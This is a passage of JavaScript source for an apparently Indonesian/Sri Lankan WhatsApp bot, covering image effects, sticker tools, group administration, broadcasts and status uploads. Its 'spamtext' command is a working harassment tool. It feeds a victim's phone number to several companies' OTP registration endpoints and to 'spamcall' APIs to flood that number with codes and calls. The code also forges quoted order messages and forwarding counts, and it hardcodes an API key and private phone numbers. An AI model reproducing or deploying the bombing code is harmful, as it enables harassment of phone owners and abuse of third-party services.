                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(14)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	                hypermod.sendMessage(from, hehe, image, {quoted:mek})
	                } else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                  	}
	                break
	                case 'costumwp':                  	 
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(14)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	                hypermod.sendMessage(from, hehe, image, {quoted:mek})
	                } else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
	                }
                	break
case 'request':  
try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
                    if (args.length < 1) return reply(`mau request apa kak??\n${prefix}request *nama fitur*`)
                    const cet1 = body.slice(9)
                    if (cet1.length > 300) return hypermod.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    var nomor = mek.participant
                    const cet2 = `*[ REQUEST FITUR ]*\nDARI ${pushname} \nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${cet1}`
                    var optionsp = {
                    text: cet2,
                    contextInfo: {mentionedJid: [nomor]},
                    } 
                    hypermod.sendMessage(`${owner}@s.whatsapp.net`, optionsp, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    hypermod.sendMessage(`94767043432@s.whatsapp.net`, optionsp, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    hypermod.sendMessage(`6285337587212@s.whatsapp.net`, optionsp, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    hypermod.sendMessage(`6281226971896@s.whatsapp.net`, optionsp, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    hypermod.sendMessage(`94767043432@s.whatsapp.net`, optionsp, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    reply(`TERIMAKASIH REQ ANDA AKAN KAMI PROSES`)
                    break
                	case 'pantaimalam':                      	 
                 	var imgbb = require('imgbb-uploader')
                	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(14)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
                    hypermod.sendMessage(from, hehe, image, {quoted: mek})
                 	} else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                  	}
                	break
	                case 'pensil':                      	 
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(14)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	                hypermod.sendMessage(from, hehe, image, {quoted:mek})
                 	} else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                 	}
                 	break 
                case 'bakar':  
                 	var imgbb = require('imgbb-uploader')
                 	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                  	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                 	 reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`)
                  	owgi = await hypermod.downloadAndSaveMediaMessage(ted)
                  	tels = body.slice(7)
                  	anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
                  	hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
                    hypermod.sendMessage(from, hehe, image, {quoted:mek})
                  	} else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                 	}
                	break
        case 'spamtext':
                reply('Otw Spam 1x')
                                       if (args[0].startsWith('08')) return reply('Gunakan nomor awalan 8/n ex : *8796662*')
                                       if (args[0].startsWith('85648910195')) return reply('Gagal tidak dapat spam nomer bot')
                                       if (args[0].startsWith('85876330812')) return reply('Gagal tidak dapat spam nomer owner')
                                       var data = body.slice(10)
                                       await fetchJson(`https://core.ktbs.io/v2/user/registration/otp/62`+data, {method: 'get'})
                                       await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=`+data, {method: 'get'})
                                       await fetchJson(`https://api.danacita.co.id/users/send_otp/?mobile_phone=62`+data, {method: 'get'})
                                       await fetchJson(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0`+data, {method: 'get'})
                                       await fetchJson(`https://zeksapi.herokuapp.com/api/spamcall?no=`+data+`&apikey=${ZeksApi}`, {method: 'get'})
                                       break      
                   case 'wanted':  
	                var imgbb = require('imgbb-uploader')
                  	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(`ඉදහන් හයිපර් හදලා එවන්නම්👻`) 
	                owgi = await hypermod.downloadAndSaveMediaMessage(ted)
	                tels = body.slice(7)
	                anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	                hehe = await getBuffer(`https://videfikri.com/api/textmaker/wanted/?urlgbr=${anu.display_url}&text1=Dicari&text2=${tels}`)
	                hypermod.sendMessage(from, hehe, image, {quoted:mek})
	               	} else {
	           	    reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
	              	}
	               	break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'pubg':
				if (!arg) return reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, mek)
				argz = arg.split("|")
				if (!argz) return reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, mek)
				axios.get(`https://xinzbot-api.herokuapp.com/api/textmaker/game?text=${argz[0]}&text2=${argz[1]}&theme=pubg&apikey=XinzBot`)
				.then((res) => sendMediaURL(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					reply(mess.error.api)
				})
				break
				case 'd':
				case 'del':
				case 'delete':
					hypermod.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await hypermod.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
				case 'clearall':
				if (!isOwner) return reply(mess.only.ownerB)
					anu = await hypermod.chats.all()
					hypermod.setMaxListeners(25)
					for (let _ of anu) {
						hypermod.deleteChat(_.jid)
					}
					sendFakeStatus(from, `Sukses`, fake)
					break
					case 'mute':
			    if (!isOwner) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                sendFakeStatus(from, `Bot berhasil dimute di chat ini`, fake)
                break
					case 'setprefix':
                if (!isOwner) return reply(mess.only.ownerB)
                if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
                if (c === 'multi'){
                    multi = true
                    sendFakeStatus(from, `Berhasil mengubah prefix ke ${c}`, fake)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    sendFakeStatus(from, `Berhasil mengubah prefix ke ${c}`, fake)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    sendFakeStatus(from, `Berhasil mengubah prefix ke ${c}`, fake)
                }
                break
					case 'restart':
if (!isOwner) return reply(mess.only.ownerB)
sendFakeStatus(from, '_Restarting Crew Bot_', fake)
exec(`node main`)
setTimeout( () => {
					hypermod.sendMessage(from, '_1_', text) // ur cods
					}, 3000) // 1000 = 1s,
					setTimeout( () => {
					hypermod.sendMessage(from, '_2_', text) // ur cods
					}, 2000) // 1000 = 1s,
					setTimeout( () => {
					hypermod.sendMessage(from, '_3_', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					sendFakeStatus(from, '_Succses Restart Crew Bot_', fake) // ur cods
					},4000) // 1000 = 1s,
break
				case 'detikvn':
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hypermod.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
						hypermod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(media)
				break
				case 'detikvideo':
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hypermod.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
						hypermod.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(media)
				break
				case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
if (args.length < 1) return reply(`Contoh : ${prefix}sharelock crew|bot`)
ppp = `${args.join(' ')}`
send = ppp.split("|")[0];
lok = ppp.split("|")[1];
hypermod.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
break
				case 'tts':
					if (args.length < 1) return hypermod.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return hypermod.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								hypermod.sendMessage(from, buff, audio, { duration: 999999999, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
				case 'demote':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag targetnya!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hypermod.groupDemoteAdmin(from, mentioned)
					} else {
						sendFakeStatus(from, `Sukses`, fake)
						hypermod.groupDemoteAdmin(from, mentioned)
					}
					break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag targernya!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hypermod.groupMakeAdmin(from, mentioned)
					} else {
						sendFakeStatus(from, `Sukses`, fake)
						hypermod.groupMakeAdmin(from, mentioned)
					}
					break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await hypermod.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink Group *${groupName}*`
					hypermod.sendMessage(from, yeh, text, { quoted: mek })
					break
				case 'grup':
					case 'group':
					case 'gc':
					if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args[0] === 'open') {
					    sendFakeStatus(from, `Sukses`, fake)
						hypermod.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'close') {
						sendFakeStatus(from, `Sukses`, fake)
						hypermod.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break
				case 'spam':
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					hypermod.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					hypermod.groupUpdateSubject(from, `${body.slice(11)}`)
					sendFakeStatus(from, 'Sukses', fake)
					break					
				case 'setdeskgc':
				case 'setdescgc':
					if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					hypermod.groupUpdateDescription(from, `${body.slice(10)}`)
					sendFakeStatus(from, 'Sukses', fake)
					break
				case 'setthumb':
			if (!isQuotedImage) return reply('Reply imagenya!')
			if (!isOwner) return reply(mess.only.ownerB)
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hypermod.downloadMediaMessage(boij)
				fs.unlinkSync(`./hypermod.jpg`)
                await sleep(1000)
				fs.writeFileSync(`./hypermod.jpg`, delb)
				hypermod.sendMessage(from, `\`\`\`Succes\`\`\``, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}}})
				break
				case 'setprofile':
				case 'setpp':
				hypermod.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner) return reply(mess.only.ownerB)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await hypermod.downloadAndSaveMediaMessage(enmediau)
					await hypermod.updateProfilePicture(botNumber, mediau)
					hypermod.sendMessage(from, `\`\`\`Succes\`\`\``, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: await getBuffer(me.imgUrl), surface: 200, message: fake, orderTitle: fake, sellerJid: '0@s.whatsapp.net'}}}})
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner) return reply(mess.only.ownerB)
				hypermod.updatePresence(from, Presence.composing)
				hypermod.groupLeave(from)
						break
case 'setyuz':
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Yuz itu kek gini bambang ``` * contoh *A* ```B```')
					yuz = args[0]
					reply(`Caption berhasil di ubah menjadi : ${yuz}`)
					break 
					case 'setowner':
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('NOMERNYA MANA GAN?')
					owner = args[0]
					reply(`Owner berhasil di ubah`)
					break 
				case 'bc':
					hypermod.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await hypermod.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hypermod.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hypermod.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hypermod.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
				case 'upswteks':
if (!isOwner) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    hypermod.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    hypermod.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`Yuzzu-Bot`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						hypermod.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						hypermod.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 999999999})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hypermod.downloadMediaMessage(encmedia)
						hypermod.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await hypermod.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    hypermod.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 999999999, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hypermod.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    hypermod.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hypermod.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    hypermod.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner) return reply(mess.only.ownerB)
				sendFakeStatus(from, 'Okey', fake)
				await sleep(1000)
				return hypermod.sendMessage(from, JSON.stringify(eval(process.exit())), text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./hypermod.jpg'), surface: 200, message: 'Yuzzu-Bot', orderTitle: 'Yuzzu-Bot', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'tomp4':
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await hypermod.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
					hypermod.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await hypermod.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						hypermod.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 999999999, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nCrew *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nCrew *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nCrew *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nCrew *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nCrew *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nCrew *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nCrew *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nCrew *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nCrew *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
